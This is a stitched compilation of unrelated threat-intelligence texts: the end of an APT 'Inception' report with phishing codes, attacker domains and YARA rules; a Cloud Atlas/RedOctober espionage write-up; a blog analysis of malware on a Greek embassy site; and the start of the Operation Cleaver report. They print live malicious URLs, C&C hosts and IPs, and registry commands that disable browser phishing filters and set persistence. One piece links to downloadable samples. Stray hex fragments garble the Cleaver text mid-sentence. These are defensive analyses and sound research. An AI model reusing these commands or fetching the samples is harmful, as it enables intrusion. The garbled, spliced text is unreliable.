baker6737                  helenarix                  reed6865
bear9126                   hill5289                   roges2913
bell0314                   jackson4996                roi5991
betty.swon                 james9521                  ronald.campbell
brown7169                  john.thompson              rosse2681
brown7356                  kalo3113                   samantares
button8437                 kas2114                    scott5008
carter0648                 kenneth.wilson             sebastianturne
carter3361                 king7460                   swon5826
clark6821                  kol8184                    taylor9297
collins2980                klauseroi                  tem5842
cook2677                   ksjdkljeijd                thirt1353
cooper2999                 lariopas                   thomas9521
cooper7271                 lopez9524                  thomson3474
cox7457                    lorrens6997                turner3027
cruz3540                   martinez4502               vasabilas
david.miller               miller8350                 visteproi
depp3353                   minesota1459               voldemarton
diaz1365                   moore6562                  wer8012
din8864                    moore7529                  white3946
evans0198                  morris9351                 william.moore
farrel0829                 morris9461                 wilson2821
ferrary2507                murphy5975                 wilson2905
ferre7053                  nedola7067                 wonder7165
flores5975                 nelson0000                 wrong8717
fox0485                    ninazer
55
Bit.ly - shortened MMS phishing links :
Action Code      Operator                 HQ location     Links created
95501            Vodafone                 UK                          270
81825            T - Mobile                 Germany                     213
66968            Proximus                 Belgium                     197
67840            China Mobile             China                       173
98491            Zain                     Saudi Arabia                126
58129            Mobilkom ( A1 Telekom )    Austria                     124
12081            Orange                   France                      124
24806            Hamrah - e - Avval           Iran                        111
41967            Mobilnil                 Egypt                       105
46736            TeliaSonera              Sweden                      100
13911            Mobistar                 Belgium                       78
65842            O2                       UK , Germany                   78
70887            Telcomsel                Indonesia                     74
98455            Kcell                    Kazakhstan                    74
94382            Mobilink                 Pakistan                      72
12988            Airtel                   India                         65
52378            Vodacom                  South Africa                  63
99578            Maxis                    Malaysia                      59
90298            Swisscom                 Switzerland                   59
86791            Wind Mobile              Canada                        56
21522            MTN                      South Africa                  56
26059            MTS                      Russia                        55
67838            Alfa                     Lebanon                       51
96735            Kyivstar                 Ukraine                       51
99753            T - Mobile                 Germany                       50
24906            Omnitel                  Lithuania                     48
17150            MtcTouch                 Lebanon                       43
53272            Ooredoo                  Qatar                         36
77008            BASE                     Belgium                       33
31756            Djezzy                   Algeria                       29
14269            Beeline                  Russia                        29
76587            Omantel                  Oman                          28
44974            Velcom                   Belarus                       27
77849            E - plus                   Germany                       26
76102            Celcom                   Malaysia                      26
31021            Azercell                 Azerbaijan                    24
16611            TELE2                    Sweden                        24
18675            Mobifone                 Vietnam                       22
65942            T - Mobile                 Germany                       20
85993            Sudatel                  Sudan                         20
65090            Diallog                  Belarus                       19
61384            Ufone                    Pakistan                      19
11426            TMCell                   Turkmenistan                  19
58043            Globe                    Philippines                   18
70102            SingTel                  Singapore                     18
90374            Avea                     Turkey                        18
57464            DiGi                     Malaysia                      16
77995            Megacom                  Kyrgyzstan                    15
27964            Warid                    Pakistan                      11
56
15029    DSTCom               Brunei              10
70959    Smart                Cambodia            10
83722    Asiacell             Iraq                10
97143    Maroc Telecom        Morocco              9
25786    Magti                Georgia              6
34659    Geocell              Georgia              6
56167    Bakcell              Azerbaijan           5
42397    Dhiraagu             Maldives             5
54375    Telfort              Netherlands          5
43142    Banglalink           Bangladesh           2
90128    EMT                  Estonia              2
24709    MTNL                 India                2
92444    Safaricom            Kenya                2
60354    Plus                 Poland               2
84899    Sabafon              Yemen                2
14115    Sri Lanka Telecom    Sri Lanka            1
42758    Lycamobile           UK                   1
57
Undetermined MMS phishing action codes ( code , number of links ) :
13975    320        54780    12      14659        3        19343    1
51557    119        92529    11      16814        3        20732    1
37020    88         61135    10      20247        3        25938    1
11111    71         89838    10      24037        3        26346    1
61925    64         44638    9       27307        3        26842    1
91130    63         60007    9       31785        3        27758    1
91200    58         67648    9       37629        3        30053    1
79711    47         72371    9       49284        3        36962    1
43312    42         96565    9       54512        3        37477    1
75687    37         99094    9       68798        3        37686    1
81544    37         24483    8       79286        3        38686    1
51949    29         46127    8       85076        3        40606    1
23562    28         55223    8       94046        3        42067    1
96780    25         99061    7       11468        2        50935    1
72026    24         20470    6       20460        2        52833    1
78098    23         22798    6       25559        2        55991    1
96878    20         32331    6       41075        2        59635    1
18986    19         40772    6       45834        2        65025    1
21782    19         52741    6       57403        2        65414    1
57673    18         63095    6       65855        2        66185    1
62088    18         70610    6       71103        2        67120    1
37267    16         92826    6       71633        2        74336    1
40019    16         25387    5       75778        2        74800    1
46681    15         69153    5       77776        2        75906    1
47390    15         72564    5       80209        2        89027    1
22775    14         24122    4       91062        2        89675    1
80998    14         47240    4       91212        2        90962    1
98758    14         76002    4       91869        2        91774    1
36942    13         82852    4       13335        1        94776    1
93620    13         83478    4       15318        1        98886    1
97276    13         97561    4       16155        1
58
Attacker - owned domains :
haarmannsi.cz
sanygroup.co.uk
ecolines.es
blackberry-support.herokuapp.com ( DynDNS )
59
YARA detection rules :
rule InceptionDLL
{
meta :
author = " Blue Coat Systems , Inc "
info = " Used by unknown APT actors :    Inception "
strings :
$ a = " dll.polymorphed.dll "
$ b = { 83 7d 08 00 0f 84 cf 00 00 00    83    7d    0c    00    0f    84 c5    00
00 00 83 7d 10 00 0f 84 bb 00 00 00    83    7d    14    08    0f    82 b1    00
00 00 c7 45 fc 00 00 00 00 8b 45 10    89    45    dc    68    00    00 }
$ c = { FF 15 ? ? ? ? ? ? ? ? 8B 4D 08 8B    11    C7    42    14    00    00 00    00
8B 45 08 8B 08 8B 55 14 89 51 18 8B    45    08    8B    08    8B    55 0C    89
51 1C 8B 45 08 8B 08 8B 55 10 89 51    20    8B    45    08    8B    08 }
$ d = { 68 10 27 00 00 FF 15 ? ? ? ? ? ?    ? ?    83    7D    CC    0A    0F 8D    47
01 00 00 83 7D D0 00 0F 85 3D 01 00    00    6A    20    6A    00    8D 4D    D4
51 E8 ? ? ? ? ? ? ? ? 83 C4 0C 8B 55 08    89    55    E8    C7    45    D8 }
$ e = { 55 8B EC 8B 45 08 8B 88 AC 23    03    00    51    8B    55    0C 52    8B
45 0C 8B 48 04 FF D1 83 C4 08 8B 55    08    8B    82    14    BB    03 00    50
8B 4D 0C 51 8B 55 0C 8B 42 04 }
condition :
any of them
}
rule InceptionRTF {
meta :
author = " Blue Coat Systems , Inc "
info = " Used by unknown APT actors : Inception "
strings :
$ a = " } } PT@T "
$ b = " XMLVERSION \"3.1.11.5604.5606 "
$ c = " objclass Word . Document.12}\\objw9355 "
condition :
all of them
}
rule InceptionMips {
meta :
author = " Blue Coat Systems , Inc "
info = " Used by unknown APT actors : Inception "
strings :
$ a = " start_sockat " ascii wide
$ b = " start_sockss " ascii wide
$ c = " 13CStatusServer " ascii wide
condition :
all of them
}
60
rule InceptionVBS {
meta :
author = " Blue Coat Systems , Inc "
info = " Used by unknown APT actors : Inception "
strings :
$ a = " c = Crypt(c , k ) "
$ b = " fso . BuildPath ( WshShell . ExpandEnvironmentStrings(a ) ,
nn ) "
condition :
all of them
}
rule InceptionBlackberry {
meta :
author = " Blue Coat Systems , Inc "
info = " Used by unknown APT actors : Inception "
strings :
$ a1 = " POSTALCODE : "
$ a2 = " SecurityCategory : "
$ a3 = " amount of free flash : "
$ a4 = " $ Ø71|'1'| : "
$ b1 = " God_Save_The_Queen "
$ b2 = " UrlBlog "
condition :
all of ( $ a * ) or all of ( $ b * )
}
rule InceptionAndroid {
meta :
author = " Blue Coat Systems , Inc "
info = " Used by unknown APT actors : Inception "
strings :
$ a1 = " BLOGS AVAILABLE= "
$ a2 = " blog - index "
$ a3 = " Ca nt create dex= "
condition :
all of them
}
rule InceptionIOS {
meta :
author = " Blue Coat Systems , Inc "
info = " Used by unknown APT actors : Inception "
strings :
$ a1 = " Developer / iOS / JohnClerk/ "
$ b1 = " SkypeUpdate "
$ b2 = " /Syscat/ "
$ b3 = " WhatsAppUpdate "
condition :
$ a1 and any of ( $ b * )
}
61
Acknowledgements
The following entities have helped in big and small ways . Big thanks to all .
CIRCL.LU
Crowdstrike
F - Secure Corporation
iSight Partners
Kaspersky Labs
Symantec Corporation
We also owe a big debt of gratitude to Ryan W. Smith of Blue Coat who helped
us tremendously with the analysis of the mobile malware .
62

Cloud Atlas : RedOctober APT is back in style
Two years ago , we published our research into RedOctober , a complex cyber - espionage operation
targeting diplomatic embassies worldwide . We named it RedOctober because we started this investigation
in October 2012 , an unusually hot month .
After our announcement in January 2013 , the RedOctober operation was promptly shut down and the
network of C&Cs was dismantled . As usually happens with these big operations , considering the huge
investment and number of resources behind it , they do n't just " go away " forever . Normally , the group goes
underground for a few months , redesigns the tools and the malware and resume operations .
See :
RedOctober Part 1
RedOctober Part 2
Since January 2013 , we 've been on the lookout for a possible RedOctober comeback . One possible hit was
triggered when we observed Mevade , an unusual piece of malware that appeared late in 2013 . The Mevade
C&C name styles as well as some other technical similarities indicated a connection to RedOctober , but the
link was weak . It was n't until August 2014 that we observed something which made us wonder if
RedOctober is back for good .
Meet Cloud Atlas
In August 2014 , some of our users observed targeted attacks with a variation of CVE-2012 - 0158 and an
unusual set of malware . We did a quick analysis of the malware and it immediately stood out because of
certain unusual things that are not very common in the APT world .
Some of the filenames used in the attacks included :
FT - Ukraine Russia 's new art of war.doc
Катастрофа малайзийского лайнера.doc
Diplomatic Car for Sale.doc
МВКСИ.doc
Organigrama Gobierno Rusia.doc
Фото.doc
Информационное письмо.doc
Форма заявки ( 25 - 26.09.14).doc
Информационное письмо.doc
Письмо_Руководителям.doc
Прилож.doc
Car for sale.doc
Af - Pak and Central Asia 's security issues.doc
At least one of them immediately reminded us of RedOctober , which used a very similarly named
spearphish : " Diplomatic Car for Sale.doc " . As we started digging into the operation , more details emerged
which supported this theory .
Perhaps the most unusual fact was that the Microsoft Office exploit did n't directly write a Windows PE
backdoor on disk . Instead , it writes an encrypted Visual Basic Script and runs it .
Cloud Atlas exploit payload - VBScript
This VBScript drops a pair of files on disk - a loader and an encrypted payload . The loader appears to be
different every time and internal strings indicate it is " polymorphically " generated . The payload is always
encrypted with a unique key , making it impossible to decrypt unless the DLL is available .
We observed several different spear - phishing documents that drop uniquely named payloads . For
instance , the " qPd0aKJu.vbs " file MD5 :
E211C2BAD9A83A6A4247EC3959E2A730 drops the following files :
DECF56296C50BD3AE10A49747573A346 - bicorporate - encrypted payload
D171DB37EF28F42740644F4028BCF727 - ctfmonrn.dll - loader
The VBS also adds a registry key :
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ setting the
key " bookstore " to the value " regsvr32 % path%\ctfmonrn.dll /s " , which ensures the malware runs every
time at system boot .
Some of the DLL names we observed include :
f4e15c1c2c95c651423dbb4cbe6c8fd5 - bicorporate.dll
649ff144aea6796679f8f9a1e9f51479 - fundamentive.dll
40e70f7f5d9cb1a669f8d8f306113485 - papersaving.dll
58db8f33a9cdd321d9525d1e68c06456 - previliges.dll
f5476728deb53fe2fa98e6a33577a9da - steinheimman.dll
Some of the payload names include :
steinheimman
papersaving
previliges
fundamentive
bicorporate
miditiming
damnatorily
munnopsis
arzner
redtailed
roodgoose
acholias
salefians
wartworts
frequencyuse
nonmagyar
shebir
getgoing
The payload includes an encrypted configuration block which contains information about the C&C sever :
The information from the config includes a WebDAV URL which is used for connections , a username and
password , two folders on the WebDAV server used to store plugins / modules for the malware and where
data from the victim should be uploaded .
C&C communication
The Cloud Atlas implants utilize a rather unusual C&C mechanism . All the malware samples we 've seen
communicate via HTTPS and WebDav with the same server " cloudme.com " , a cloud services provider .
According to their website , CloudMe is owned and operated by CloudMe AB , a company based in
Linköping , Sweden .
( Important note : we do not believe that CloudMe is in any way related to the Cloud Atlas group - the
attackers simply create free accounts on this provider and abuse them for command - and - control ) .
Each malware set we have observed so far communicates with a different CloudMe account though . The
attackers upload data to the account , which is downloaded by the implant , decrypted and interpreted . In
turn , the malware uploads the replies back to the server via the same mechanism . Of course , it should be
possible to reconfigure the malware to use any Cloud - based storage service that supports WebDAV .
Here 's a look at one such account from CloudMe :
The data from the account :
The files stored in the randomly named folder were uploaded by the malware and contain various things ,
such as system information , running processes and current username . The data is compressed with LZMA
and encrypted with AES , however , the keys are stored in the malware body which makes it possible to
decrypt the information from the C&C.
We previously observed only one other group using a similar method – ItaDuke – that connected to
accounts on the cloud provider mydrive.ch .
Victim statistics : top 5 infected countries
Similarities with RedOctober
Just like with RedOctober , the top target of Cloud Atlas is Russia , followed closely by Kazakhstan ,
according to data from the Kaspersky Security Network ( KSN ) . Actually , we see an obvious overlap of
targets between the two , with subtle differences which closely account for the geopolitical
changes in the region that happened during the last two years .
Interestingly , some of the spear - phishing documents between Cloud Atlas and RedOctober seem to exploit
the same theme and were used to target the same entity at different times .
Both Cloud Atlas and RedOctober malware implants rely on a similar construct , with a loader and the final
payload that is stored encrypted and compressed in an external file . There are some important differences
though , especially in the encryption algorithms used – RC4 in RedOctober vs AES in Cloud Atlas .
The usage of the compression algorithms in Cloud Altas and RedOctober is another interesting similarity .
Both malicious programs share the code for LZMA compression algorithm . In CloudAtlas it is used to
compress the logs and to decompress the decrypted payload from the C&C servers , while in Red October
the " scheduler " plugin uses it to decompress executable payloads from the C&C.
It turns out that the implementation of the algorithm is identical in both malicious modules , however the
way it is invoked is a bit different , with additional input sanity checks added to the CloudAtlas version .
Another interesting similarity between the malware families is the configuration of the build system used
to compile the binaries . Every binary created using the Microsoft Visual Studio toolchain has a special
header that contains information about the number of input object files and version information of the
compilers used to create them , the " Rich " header called so by the magic string that is used to identify it in
the file .
We have been able to identify several RedOctober binaries that have " Rich " headers describing exactly the
same layout of VC 2010 + VC 2008 object files . Although this does n't necessarily mean that the binaries
were created on the same development computer , they were definitely compiled using the same version of
the Microsoft Visual Studio up to the build number version and using similar project configuration .
Number of object
Number of object       Number of object
files , Red October      HEX compiler           Decoded compiler
files , CloudAtlas      files , Red October
Fileputexec            version                version
loader                 Office plugin
plugin
VC 2010 ( build
01                     01                     01                     009D766F
30319 )
VC 2010 ( build
01                     01                     01                     009B766F
30319 )
VC 2010 ( build
22                     2E                     60                     00AB766F
30319 )
5B                     60                     A3                     00010000               –
VC 2008 ( build
05                     07                     11                     00937809
30729 )
VC 2010 ( build
72                     5C                     AD                     00AA766F
30319 )
VC 2010 ( build
20                     10                     18                     009E766F
30319 )
To summarize the similarities between the two :
Cloud Atlas                     RedOctober
Shellcode marker in spearphished
PT@T                            PT@T
documents
Top target country                       Russia                          Russia
Compression algorithm used for
LZMA                            LZMA
C&C communications
C&C servers claim to be / redirect to    BBC ( mobile malware )            BBC
VC 2010 ( build 30319 ) ( some
Compiler version                         VC 2010 ( build 30319 )
modules )
Finally , perhaps the strongest connection comes from targeting . Based on observations from KSN , some
of the victims of RedOctober are also being targeted by CloudAtlas . In at least one case , the
victim 's computer was attacked only twice in the last two years , with only two malicious
programs – RedOctober and Cloud Atlas .
These and other details make us believe that CloudAtlas represents a rebirth of the RedOctober attacks .
Conclusion
Following big announcements and public exposures of targeted attack operations , APT groups behave in a
predictable manner . Most Chinese - speaking attackers simply relocate C&C servers to a different place ,
recompile the malware and carry on as if nothing happened .
Other groups that are more nervous about exposure go in a hibernation mode for months or years . Some
may never return using the same tools and techniques .
However , when a major cyber - espionage operation is exposed , the attackers are unlikely to completely
shut down everything . They simply go offline for some time , completely reshuffle their tools and return
with rejuvenated forces .
We believe this is also the case of RedOctober , which makes a classy return with Cloud
Atlas .
Kaspersky products detect the malware from the Cloud Atlas toolset with the following verdicts :
Exploit . Win32.CVE-2012 - 0158.j
Exploit . Win32.CVE-2012 - 0158.eu
Exploit . Win32.CVE-2012 - 0158.aw
Exploit . MSWord . CVE-2012 - 0158.ea
HEUR : Trojan . Win32.CloudAtlas.gen
HEUR : Trojan . Win32.Generic
HEUR : Trojan . Script . Generic
Trojan - Spy . Win32.Agent.ctda
Trojan - Spy . Win32.Agent.cteq
Trojan - Spy . Win32.Agent.ctgm
Trojan - Spy . Win32.Agent.ctfh
Trojan - Spy . Win32.Agent.cter
Trojan - Spy . Win32.Agent.ctfk
Trojan - Spy . Win32.Agent.ctfj
Trojan - Spy . Win32.Agent.crtk
Trojan - Spy . Win32.Agent.ctcz
Trojan - Spy . Win32.Agent.cqyc
Trojan - Spy . Win32.Agent.ctfg
Trojan - Spy . Win32.Agent.ctfi
Trojan - Spy . Win32.Agent.cquy
Trojan - Spy . Win32.Agent.ctew
Trojan - Spy . Win32.Agent.ctdg
Trojan - Spy . Win32.Agent.ctlf
Trojan - Spy . Win32.Agent.ctpz
Trojan - Spy . Win32.Agent.ctdq
Trojan - Spy . Win32.Agent.ctgm
Trojan - Spy . Win32.Agent.ctin
Trojan - Spy . Win32.Agent.ctlg
Trojan - Spy . Win32.Agent.ctpd
Trojan - Spy . Win32.Agent.ctps
Trojan - Spy . Win32.Agent.ctpq
Trojan - Spy . Win32.Agent.ctpy
Trojan - Spy . Win32.Agent.ctie
Trojan - Spy . Win32.Agent.ctcz
Trojan - Spy . Win32.Agent.ctgz
Trojan - Spy . Win32.Agent.ctpr
Trojan - Spy . Win32.Agent.ctdp
Trojan - Spy . Win32.Agent.ctdr
Trojan . Win32.Agent.idso
Trojan . Win32.Agent.idrx
HEUR : Trojan . Linux . Cloudatlas.a
Trojan . AndroidOS.Cloudatlas.a
Trojan . IphoneOS.Cloudatlas.a
Parallel research :
Blue Coat Exposes Inception Framework

# 9 Blitzanalysis : Embassy of Greece Beijing - Compromise
It 's friday afternoon , I had a bit of free time and stumbled across this tweet by PhysicalDrive0 ( thx ! ) two
hours ago and thought to give it a try to finally add a new article to this Blog ( first of 2014 ) :
https://twitter.com/PhysicalDrive0/status/479921770838102017
So , I went to Google to search for the domain of the Embassy of Greece Beijing and added the ( allegedly )
malicious java file package that was found by PhysicalDrive0 :
URL : http://www.grpressbeijing.com/1.jar ( malicious ! )
Next , I loaded the 1.jar file into Java Decompiler to get the source code . It showed , that the functionality is
obfuscated in some way , e.g. the function csfn(String paramString ) decrypts all strings by " removing " the
numbers of the string parameter :
csfn("64s33333e3333t333S55e666c777u5r333i534t76y2M34a55n76a88g666e44r2222 " ) - >
setSecurityManager
There are some other obfuscation techniques , but they are not important here . Instead , the following
deobfuscated code line in the function init ( ) gives us an idea where the actual payload is located :
Resp localResp = new Resp(csfn("234p34a55445c43654k632434234235 " ) ) ; - > pack
We can also see , that the java package contains a file named pack , so we open 7-Zip and unpack the file . A
quick view with a PE viewer showed , that it is a x86 PE executable not even encrypted ( SHA256 :
b832e4b5a4829c8df6de7b42c5cb32ef25b5ab59072b4c2a7838404cd0dd5e5f ) :
Figure 2 : Payload inside Java package
Figure 3 : Payload inside PE viewer
So , I opened IDA Pro to take a quick look at the functionality . Together with the strings of the executable ,
we get a brief idea of what the purpose of this malware is . The important strings are as follows :
SELECT * FROM AntiVirusProduct
reg add " HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings " /v PrivDiscUiShown /t
REG_DWORD /d 1 /f
reg add " HKCU\Software\Microsoft\Internet Explorer\Main " /v DEPOff /t REG_DWORD /d 1 /f
reg add " HKCU\Software\Microsoft\Internet Explorer\Main " /v DisableFirstRunCustomize /t
REG_DWORD /d 2 /f
reg add " HKCU\Software\Microsoft\Internet Explorer\Main " /v Check_Associations /t REG_SZ /d no
/f
reg add " HKCU\Software\Microsoft\Internet Explorer\Main "
reg add " HKCU\Software\Microsoft\Internet Explorer\PhishingFilter " /v ShownVerifyBalloon /t
REG_DWORD /d 3 /f
reg add " HKCU\Software\Microsoft\Internet Explorer\PhishingFilter " /v Enabled /t REG_DWORD /d
1 /f
reg add " HKCU\Software\Microsoft\Internet Explorer\PhishingFilter "
reg add " HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings " /v
WarnOnPostRedirect /t REG_DWORD /d 0 /f
reg add " HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings " /v
WarnonZoneCrossing /t REG_DWORD /d 0 /f
reg add " HKCU\Software\Microsoft\Internet Connection Wizard " /v AutoRecover /t REG_DWORD /d
2 /f
reg add " HKCU\Software\Microsoft\Internet Connection Wizard " /v Completed /t REG_BINARY /d 1
/f
\cmd.exe
Together with the output of IDA Pro , we can see that this malware uses the command line tool cmd.exe for
adding several registry keys to Internet Explorer . It also tries to retrieve possible AntiVirus information by
using the COM interface ( dc12a687 - 737f-11cf-884d-00aa004b2e24 - > IWbemLocator - > SELECT *
FROM AntiVirusProduct ) . Furthermore , it makes use of the COM to launch an instance of Internet
Explorer ( d30c1661-cdaf-11d0 - 8a3e-00c04fc9e26e - > IWebBrowser2 ) , supposedly to contact its C&C
server . To verify this , we open up Wireshark and run the executable . As a result , we get the following
network information :
C&C server : defense.miraclecz.com ( IP : 208.115.124.83 )
HTTP GET request : /index.asp?id=50100
Also , we see that it downloads some kind of data ( Base64 encoded ) . But first , we combine the C&C server
and the HTTP request and open the URL in our favorite Browser :
Figure 4 : Base64 encoded ( 2nd ) Payload
URL : defense.miraclecz.com/index.asp?id=50100
As you can see , there is a string named microsoft followed by Base64 encoded data . Side note : Is there
also a Linux equivalent ?
Next , we copy the Base64 encoded data and go to the following website to let us decode it into a file
( because I had the feeling it 's just another unencrypted executable ) :
http://www.motobit.com/util/base64-decoder-encoder.asp
As a result , we get another executable ( SHA256 :
a4863f44f48d1c4c050dd7baad767a86b348dd4d33924acf4e0a3cd40c6ae29f ) that was only Base64
encoded and not encrypted in any way :
Figure 5 : Downloaded Payload
So again , we fire up our PE viewer and take a look at the important strings :
http://buy.miraclecz.com
reg add " HKCU\Software\Microsoft\Internet Explorer\Main " /v DEPOff /t REG_DWORD /d 1 /f
reg add " HKCU\Software\Microsoft\Internet Explorer\Main " /v DisableFirstRunCustomize /t
REG_DWORD /d 2 /f
reg add " HKCU\Software\Microsoft\Internet Explorer\Main " /v Check_Associations /t REG_SZ /d no
/f
reg add " HKCU\Software\Microsoft\Internet Explorer\Main "
reg add " HKCU\Software\Microsoft\Internet Explorer\PhishingFilter " /v ShownVerifyBalloon /t
REG_DWORD /d 3 /f
reg add " HKCU\Software\Microsoft\Internet Explorer\PhishingFilter " /v Enabled /t REG_DWORD /d
1 /f
reg add " HKCU\Software\Microsoft\Internet Explorer\PhishingFilter "
reg add " HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings " /v
WarnOnPostRedirect /t REG_DWORD /d 0 /f
reg add " HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings " /v
WarnonZoneCrossing /t REG_DWORD /d 0 /f
reg add " HKCU\Software\Microsoft\Internet Connection Wizard " /v AutoRecover /t REG_DWORD /d
2 /f
reg add " HKCU\Software\Microsoft\Internet Connection Wizard " /v Completed /t REG_BINARY /d 1
/f
reg add " HKCU\Software\Microsoft\Windows\CurrentVersion\Run " /v spoolsv.exe /t REG_SZ /d
% % temp%%\spoolsv.exe /f
spoolsv.exe
Software\Microsoft\Windows\CurrentVersion\Run
open file fail
cmd timeout error % d
Run cmd error % d
cmd.exe /c % s>%s
% s%d.txt
open file error
% temp%
% s%s.ini
myWObject
\cmd.exe
! DOCTYPE html
% s/?id1=blank%d&id2=%d%d
% s/?id1=%d%d
Again , we load the executable into IDA Pro and quickly fly over the assembly code to get an idea of the
functionality . Once again , it creates several registry entries with the help of the command line tool and
creates an instance of the Internet Explorer ( CoCreateInstance ( ) - > d30c1661-cdaf-11d0 - 8a3e-
00c04fc9e26e ) for contacting the C&C server . This time , the network information is as follows :
C&C server : buy.miraclecz.com ( IP : 74.121.191.33 )
URL parameters ( from strings of executable ) :
% s/?id1=blank%d&id2=%d%d
% s/?id1=%d%d
From the code we can see , that the sample has also the ability to encode / decode data from / to Base64 . The
dynamic analysis showed the malware sample contacted the C&C server , but was n't sending any URL
parameters ( id1 , id2 ) . Also the server did n't respond ...
The files can be downloaded here :
https://www.dropbox.com/s/ckr7p5kka62cc7s/Embassy%20of%20Greece%20-%20Beijing.zip
Password : " infected " ( without " ")
That 's it , have a nice weekend ...

6f20476f6f64
44
20
c
c2
c2 b204576696
6f20476 f64
44
20
6c
6e
04576696
9
86
546
6b2
6e
9
86
546
# OPCLEAVER
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
“ Iran should be considered a first - tier cyber power . ”
Gabi Siboni
Israel Institute for National Security Studies cybersecurity expert
“ Iran has rapidly gained near parity with the Chinese but
may be closer to the Russians in terms of swagger . ”
Retired Admiral William J. Fallon
Former Commander CENTCOM
“ Global critical infrastructure organizations need to take this
threat seriously . The Iranian adversary is real and they ’re
coming , if not already here . ”
Mark Weatherford
Former Deputy Under Secretary for Cybersecurity at the US Department of Homeland Security
“ Yes , China and one or two others
can shut down our power grids . ”
Admiral Michael Rogers
Director of the National Security Agency and head of US Cyber Command
“ The world has combated cyber threats by doing the same
thing over and over again … It ’s the definition of insanity . ”
Jeff Moss
Co - Chair DHS Community Resiliency Task Force , Founder of DEFCON and BlackHat
Jalal ad - Din Muhammad Rumi
13th Century Persian poet , jurist , theologian and Sufi mystic
English translation : “ Silence gives answers . ”
2
# OPCLEAVER
PREVENTION IS EVERYTHING
A personal note from Cylance , CEO Stuart McClure
O
n February 24 , 1989 , United Flight 811 left Honolulu , Hawaii , on its way to Auckland , New Zealand , with
364 souls on board . Somewhere between 23,000 and 24,000 feet an enormous explosion ejected nine
passengers into the dark void over the Pacific Ocean.1 This aviation disaster was later determined to have
been caused by a simple design flaw combined with the lack of corrective action . Boeing and the FAA had
known about this problem for over one year prior to the accident . The result : nine people lost their lives . The other 337
passengers plus 18 crew members who survived , live with the memory every day ; all of it due to a highly preventable
design flaw . As a 19-year - old young adult , I was grateful to have survived but I had no idea how that single event would
impact my future in such a profound way . Much of my passion for cybersecurity can be directly attributed to that
fateful day .
The United Flight 811 accident proves just how important it is to detect flaws before tragedy strikes . Preventable
6 f20476 f64
disasters like this are what motivates the Cylance team to create a safer world . We do everything we can to uncover
4 4
the flaws in technologies before they damage the physical or cyber world . Our mission is simple : to protect the world .
This report is an attempt to deliver on that mission .
20 and professionally for more than 26 years , there is no doubt in my mind
After tracking hackers both personally
c
that the release of the information contained in the Operation Cleaver report is vital to the security of the world ’s
c2
critical infrastructure .
04576696
The focus of the Operation Cleaver report is on one particular Iranian team we ’ve dubbed Tarh Andishan , the
infrastructure they utilize , as well as their tactics , techniques and procedures . Roughly translated , “ Tarh Andishan ”
means “ thinkers ” or “ innovators ” . This team displays an evolved skillset and uses a complex infrastructure to perform
attacks of espionage , theft , and the potential destruction of control systems and networks . While our investigation is
ongoing , and we presently have limited visibility inside many of the compromised networks , Cylance observed Tarh
Andishan actively targeting , attacking , and compromising more than 50 victims since at least 2012 .
Cylance is committed to responsible disclosure and has refrained from exaggeration and embellishment in this
2
report , limiting our content to only that which can be definitively confirmed . However , we have speculated on the
b
possible motivations behind these attacks , given our deep knowledge and understanding of the cyber landscape .
6
We have made every effort to notify all affected entities prior to publishing this report . Additionally , all personally
6e
identifiable information about the members of Operation Cleaver has been withheld . We do n’t care who the adversary
9
is , where they work or reside , who they ’re dating or what party photos they upload to Facebook – all we care about is
6
preventing campaigns like Operation Cleaver from negatively affecting the real world .
8
546
This report is for the world ’s cyber defenders – never give up !
Sincerely ,
Stuart McClure
CEO / President
Cylance , Inc.
3
476f6f64
6f20
44
OPERATION
20
2c
b204576696c
CLEAVER
e6
96
86
546
TABLE OF CONTENTS
Executive Summary ......................................................................... 5
Background ........................................................................................ 6
Why the name “ Cleaver ” ? ............................................................. 8
Why Expose Iran Now ? .................................................................. 8
Critical Discoveries ......................................................................... 9
Targets & Victims ............................................................................ 12
Attribution ......................................................................................... 17
Attacker IP Addresses .............................................................. 18
Attacker Domains ...................................................................... 19
Tools & Software ........................................................................ 20
Tarh Andishan ............................................................................ 24
Members ...................................................................................... 26
Teams ............................................................................................ 30
Tactics , Techniques & Procedures ( TTPs ) ............................... 31
Initial Compromise ..................................................................... 32
Privilege Escalation & Pivoting ............................................... 36
Exfiltration .................................................................................... 41
Persistence .................................................................................. 47
Mitigation .......................................................................................... 60
Speculation : The Why ................................................................... 62
Conclusion ........................................................................................ 65
References ........................................................................................ 67
About Cylance ................................................................................. 68
Cylance Products ........................................................................... 69
Cylance Services ............................................................................ 70
Acknowledgments ...................................................................... 71
The Operation Cleaver Logo ...................................................... 72
Appendix A : Indicators of Compromise ( IOC ) ........................ 73
4
# OPCLEAVER
EXECUTIVE SUMMARY
Since at least 2012 , Iranian actors have directly attacked ,
established persistence in , and extracted highly sensitive
materials from the networks of government agencies and major
critical infrastructure companies in the following countries :
Canada , China , England , France , Germany , India , Israel ,
Kuwait , Mexico , Pakistan , Qatar , Saudi Arabia , South Korea ,
Turkey , United Arab Emirates , and the United States .
6 f20476 f64
Iran is the new China .      44
20 the past several years , conducted a significant global surveillance
Operation Cleaver has , over
c
and infiltration campaign . To date it has successfully evaded detection by existing security
c2
technologies . The group is believed to work from Tehran , Iran , although auxiliary team
04576696
members were identified in other locations including the Netherlands , Canada , and the UK .
The group successfully leveraged both publicly available , and customized tools to attack and
compromise targets around the globe . The targets include military , oil and gas , energy and
utilities , transportation , airlines , airports , hospitals , telecommunications , technology , education ,
aerospace , Defense Industrial Base ( DIB ) , chemical companies , and governments .
During intense intelligence gathering over the last 24 months , we observed the technical
2
capabilities of the Operation Cleaver team rapidly evolve faster than any previously observed
6b
Iranian effort . As Iran ’s cyber warfare capabilities continue to morph,2 the probability of an attack
e
that could impact the physical world at a national or global level is rapidly increasing.3 Their
6
capabilities have advanced beyond simple website defacements , Distributed Denial of Service
9
( DDoS ) attacks , and Hacking Exposed style techniques .
86
546
With minimal separation between private companies and the Iranian government , their modus
operandi seems clear : blur the line between legitimate engineering companies and state-
sponsored cyber hacking teams to establish a foothold in the world ’s critical infrastructure .
Iran ’s rising expertise , along with their choice of victims , has compelled us to release this report
sooner than we would have liked in order to expose Operation Cleaver to the world . The
evidence and indicators of compromise we provide in this report will allow potentially unaware
victims to detect and eliminate Cleaver ’s incursions into their networks .
5
